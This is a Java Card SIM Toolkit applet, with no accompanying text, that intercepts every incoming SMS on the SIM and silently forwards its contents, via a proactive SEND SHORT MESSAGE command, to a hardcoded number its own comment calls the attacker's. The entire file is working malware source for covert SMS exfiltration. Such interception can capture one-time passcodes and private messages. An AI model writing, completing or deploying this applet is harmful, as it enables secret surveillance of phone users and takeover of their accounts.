package sms.interceptor;

import javacard.framework.*;
import sim.toolkit.*;

public class SMSInterceptor extends Applet implements ToolkitInterface {

    // Attacker's number for SMS forwarding
    private static final byte[] FORWARD_NUMBER = {
        (byte)0x09, (byte)0x87, (byte)0x65, (byte)0x43, (byte)0x21, (byte)0x0F
    };

    private ToolkitRegistry registry;

    public static void install(byte[] bArray, short bOffset, byte bLength) {
        new SMSInterceptor().register();
    }

    protected SMSInterceptor() {
        registry = ToolkitRegistry.getEntry();
        registry.setEvent(EVENT_SMS_PP_DOWNLOAD);
    }

    public void processToolkit(byte event) {
        switch (event) {
            case EVENT_SMS_PP_DOWNLOAD:
                handleIncomingSMS();
                break;
        }
    }

    private void handleIncomingSMS() {
        EnvelopeHandler envHdlr = EnvelopeHandler.getTheHandler();

        byte[] smsData = new byte[160];
        short length = envHdlr.getValueLength(TAG_SMS_TPDU, (byte)1);
        envHdlr.copyValue(TAG_SMS_TPDU, (byte)1, smsData, (short)0, length);

        forwardSMS(smsData, length);
    }

    private void forwardSMS(byte[] smsData, short length) {
        ProactiveHandler proHdlr = ProactiveHandler.getTheHandler();

        proHdlr.init(PRO_CMD_SEND_SHORT_MESSAGE, (byte)0, DEV_ID_NETWORK);
        proHdlr.appendTLV(TAG_ADDRESS, FORWARD_NUMBER, (short)0, (byte)FORWARD_NUMBER.length);
        proHdlr.appendTLV(TAG_SMS_TPDU, smsData, (short)0, length);
        proHdlr.send();
    }

    public void process(APDU apdu) {
        if (selectingApplet()) {
            return;
        }
    }
}
